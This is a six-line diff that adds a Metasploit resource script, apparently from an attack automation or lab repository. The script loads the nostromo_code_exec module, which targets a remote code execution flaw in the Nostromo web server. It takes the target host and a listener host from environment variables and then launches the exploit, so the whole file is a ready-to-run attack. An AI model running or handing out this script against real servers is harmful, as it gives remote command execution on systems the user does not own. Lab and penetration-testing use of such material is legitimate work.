@@ -1,0 +1,6 @@
+use exploit/multi/http/nostromo_code_exec
+<ruby>
+run_single("set RHOST #{ENV['RHOST']}")
+run_single("set LHOST #{ENV['LHOST']}")
+</ruby>
+exploit
